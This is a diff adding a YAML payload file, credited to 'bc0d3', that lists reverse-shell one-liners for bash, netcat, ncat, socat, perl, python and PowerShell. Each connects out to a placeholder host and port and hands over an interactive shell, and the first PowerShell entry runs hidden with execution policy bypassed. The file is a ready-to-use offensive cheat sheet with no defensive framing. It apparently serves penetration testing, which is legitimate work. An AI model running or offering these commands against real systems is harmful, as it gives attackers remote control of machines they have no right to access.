@@ -1,0 +1,28 @@
+#Author: bc0d3
+#date: 22/10/2022
+reverse_shell:
+  bash:
+  - bash -i >& /dev/tcp/[HOST]/[PORT] 0>&1
+  - 0<&196;exec 196<>/dev/tcp/[HOST]/[PORT]; sh <&196 >&196 2>&196
+  - /bin/bash -l > /dev/tcp/[HOST]/[PORT] 0<&1 2>&1
+  netcat:
+  - nc -e /bin/sh [HOST] [PORT]
+  - nc -e /bin/bash [HOST] [PORT]
+  - nc -c bash [HOST] [PORT]
+  ncat:
+  - ncat [HOST] [PORT] -e /bin/bash
+  - ncat --udp [HOST] [PORT] -e /bin/bash
+  socat:
+  - Attacker$ socat file:`tty`,raw,echo=0 TCP-L:[PORT]
+  - Victim$ /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:[HOST]:[PORT]
+  perl:
+  - perl -e 'use Socket;$i="[HOST]";$p=[PORT];socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+  - perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[HOST]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+  - perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"[HOST]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+  python:
+  - python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[HOST]",[PORT]));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
+  - python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[HOST]",[PORT]));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+  - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[HOST]",[PORT]));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  powershell:
+  - powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("[HOST]",[PORT]);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+  - powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('[HOST]',[PORT]);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
